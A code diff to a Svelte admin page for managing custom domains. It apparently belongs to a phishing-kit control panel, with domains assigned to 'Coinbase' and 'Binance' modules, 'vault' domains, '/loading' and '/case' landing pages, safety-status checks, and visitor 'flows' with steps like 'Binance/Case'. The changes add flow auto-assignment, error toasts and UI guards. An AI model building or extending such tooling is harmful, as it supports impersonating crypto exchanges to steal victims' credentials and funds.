@@ -24,6 +24,7 @@
 	import type { CustomDomain } from '$lib/server/state';
 	import { MODULES, getLandingPagesFor } from '$lib/modules';
 	import { toast } from '$lib/stores/toast';
+	import { flows } from '$lib/stores/websocket';
 
 	const AUTO_MODE_KEY = 'domains-auto-mode';
 
@@ -39,16 +40,19 @@
 	let copied = $state<string | null>(null);
 	let expanded = $state<Record<string, boolean>>({});
 	let confirmDeleteDomain = $state<CustomDomain | null>(null);
+	let adding = $state(false);
 
 	// Add-form state
 	let newDomain = $state('');
 	let newKind = $state<'regular' | 'vault'>('regular');
 	let newModule = $state('Coinbase');
 	let newLanding = $state('/loading');
+	let newFlowId = $state('');
 
 	// Edit-form state
 	let editModule = $state('Coinbase');
 	let editLanding = $state('/loading');
+	let editFlowId = $state('');
 
 	async function fetchDomains() {
 		loading = true;
@@ -57,6 +61,8 @@
 			if (res.ok) {
 				const data = await res.json();
 				domains = data.domains;
+			} else {
+				toast.error('Failed to load domains');
 			}
 		} finally {
 			loading = false;
@@ -112,7 +118,8 @@
 	}
 
 	async function addDomain() {
-		if (!newDomain.trim()) return;
+		if (!newDomain.trim() || adding) return;
+		adding = true;
 		const trimmed = newDomain.trim();
 		const res = await fetch('/api/domains', {
 			method: 'POST',
@@ -121,7 +128,8 @@
 				domain: trimmed,
 				module: newModule,
 				landingPage: newLanding,
-				kind: newKind
+				kind: newKind,
+				flowId: newFlowId
 			})
 		});
 		if (res.ok) {
@@ -131,6 +139,7 @@
 			newKind = 'regular';
 			newModule = 'Coinbase';
 			newLanding = '/loading';
+			newFlowId = '';
 			addOpen = false;
 			await fetchDomains();
 			toast.success(`Added domain ${trimmed}`);
@@ -153,6 +162,7 @@
 		} else {
 			toast.error('Failed to add domain');
 		}
+		adding = false;
 	}
 
 	async function deleteDomain(d: CustomDomain) {
@@ -183,19 +193,23 @@
 			if (data.domain) {
 				domains = domains.map((d) => (d.id === id ? data.domain : d));
 			}
+		} else {
+			toast.error('Failed to update domain');
 		}
 	}
 
 	async function checkStatus(d: CustomDomain) {
-		await fetch(`/api/domains/${d.id}/check-status`, { method: 'POST' });
+		const res = await fetch(`/api/domains/${d.id}/check-status`, { method: 'POST' });
 		await fetchDomains();
-		toast.info(`Checked status for ${d.domain}`);
+		if (res.ok) toast.info(`Checked status for ${d.domain}`);
+		else toast.error(`Failed to check status for ${d.domain}`);
 	}
 
 	async function checkSafety(d: CustomDomain) {
-		await fetch(`/api/domains/${d.id}/check-safety`, { method: 'POST' });
+		const res = await fetch(`/api/domains/${d.id}/check-safety`, { method: 'POST' });
 		await fetchDomains();
-		toast.info(`Checked safety for ${d.domain}`);
+		if (res.ok) toast.info(`Checked safety for ${d.domain}`);
+		else toast.error(`Failed to check safety for ${d.domain}`);
 	}
 
 	async function syncDns(d: CustomDomain) {
@@ -231,13 +245,14 @@
 		editing = d;
 		editModule = d.module;
 		editLanding = d.landingPage;
+		editFlowId = d.flowId || '';
 		editorOpen = true;
 	}
 
 	async function saveEdit() {
 		if (!editing) return;
 		const name = editing.domain;
-		await patchDomain(editing.id, { module: editModule, landingPage: editLanding });
+		await patchDomain(editing.id, { module: editModule, landingPage: editLanding, flowId: editFlowId });
 		editorOpen = false;
 		editing = null;
 		toast.success(`Saved changes to ${name}`);
@@ -277,6 +292,8 @@
 <svelte:head>
 	<title>Domains · Panel</title>
 </svelte:head>
+
+<svelte:window onkeydown={(e) => { if (e.key === 'Escape') { if (addOpen) addOpen = false; else if (editorOpen) editorOpen = false; else if (confirmDeleteDomain) confirmDeleteDomain = null; } }} />
 
 <div class="p-8 pt-5">
 	<!-- Header -->
@@ -655,6 +672,25 @@
 					</select>
 				</div>
 
+				<div>
+					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Auto-Assign Flow (optional)</label>
+					<select bind:value={newFlowId} onchange={() => {
+						if (newFlowId) {
+							const f = $flows.find((fl) => fl.id === newFlowId);
+							const first = f?.steps.find((s) => /^[A-Z][^/]+\/.+/.test(s)) || '';
+							if (first.includes('Case ID') || first === 'Binance/Case') {
+								newLanding = '/case';
+							}
+						}
+					}} class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
+						<option value="">— None (visitors stay on landing page) —</option>
+						{#each $flows.filter((f) => f.active) as f}
+							<option value={f.id}>{f.name} ({f.steps.length} steps)</option>
+						{/each}
+					</select>
+					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">Visitors landing on this domain will be routed through this flow.{#if newFlowId && newLanding === '/case'} Landing auto-set to /case.{/if}</p>
+				</div>
+
 				<p class="rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2 font-mono text-[11px] text-[var(--muted-foreground)]">
 					Preview: https://{newDomain || 'example.com'}{newLanding}
 				</p>
@@ -662,7 +698,7 @@
 
 			<div class="mt-6 flex justify-end gap-2">
 				<button onclick={() => (addOpen = false)} class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
-				<button onclick={addDomain} disabled={!newDomain.trim()} class="btn-accent px-4 py-2 text-sm disabled:opacity-50 disabled:cursor-not-allowed">Add Domain</button>
+				<button onclick={addDomain} disabled={!newDomain.trim() || adding} class="btn-accent px-4 py-2 text-sm disabled:opacity-50 disabled:cursor-not-allowed">{adding ? 'Adding…' : 'Add Domain'}</button>
 			</div>
 		</div>
 	</div>
@@ -704,6 +740,31 @@
 							<option value={p.value}>{p.label} ({p.value})</option>
 						{/each}
 					</select>
+				</div>
+
+				<div>
+					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">
+						Auto-Assign Flow
+					</label>
+					<select
+						bind:value={editFlowId}
+						onchange={() => {
+							if (editFlowId) {
+								const f = $flows.find((fl) => fl.id === editFlowId);
+								const first = f?.steps.find((s) => /^[A-Z][^/]+\/.+/.test(s)) || '';
+								if (first.includes('Case ID') || first === 'Binance/Case') {
+									editLanding = '/case';
+								}
+							}
+						}}
+						class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+					>
+						<option value="">— None (visitors stay on landing page) —</option>
+						{#each $flows.filter((f) => f.active) as f}
+							<option value={f.id}>{f.name} ({f.steps.length} steps)</option>
+						{/each}
+					</select>
+					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">Visitors landing on this domain will be routed through this flow.</p>
 				</div>
 
 				<div class="rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2">
